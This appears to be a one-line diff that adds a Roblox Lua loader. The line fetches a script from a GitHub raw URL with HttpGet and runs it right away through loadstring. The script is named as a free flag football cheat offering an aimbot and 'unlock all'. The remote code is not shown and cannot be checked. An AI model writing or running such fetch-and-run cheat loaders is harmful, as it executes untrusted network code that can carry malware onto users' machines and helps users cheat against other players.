@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ShinobiComplys/loaders/main/loaders/free-flag-football-script-mags-qb-aimbot-unlock-all-4c406b42.lua"))()
